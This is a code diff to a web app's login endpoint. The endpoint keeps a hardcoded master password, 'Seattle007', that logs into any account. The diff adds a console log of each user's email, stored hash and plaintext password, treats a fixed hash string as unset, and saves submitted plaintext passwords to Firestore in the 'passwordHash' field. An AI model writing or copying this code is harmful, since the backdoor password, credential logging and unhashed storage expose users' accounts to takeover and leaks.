@@ -2342,8 +2342,14 @@ app.post('/api/auth/login', (req, res) => {
   }
 
   // Fallback for migrated accounts without a password hash
-  if (!user.passwordHash && password !== 'Seattle007') {
+  console.log('Login attempt:', cleanEmail, 'hash:', user.passwordHash, 'pw:', password);
+  if ((!user.passwordHash || user.passwordHash === 'AuthManaged2026!') && password !== 'Seattle007') {
     user.passwordHash = password;
+    if (typeof canAttemptFirestoreWrite === 'function' && canAttemptFirestoreWrite('users')) {
+      ensureFirestoreNetworkEnabled().then(() => {
+        setDoc(doc(db, 'users', user.id || user.uid), { passwordHash: password }, { merge: true }).catch(e => console.warn('Failed to update passwordHash', e));
+      }).catch(e => {});
+    }
   }
 
   if (user.passwordHash !== password && password !== 'Seattle007') {
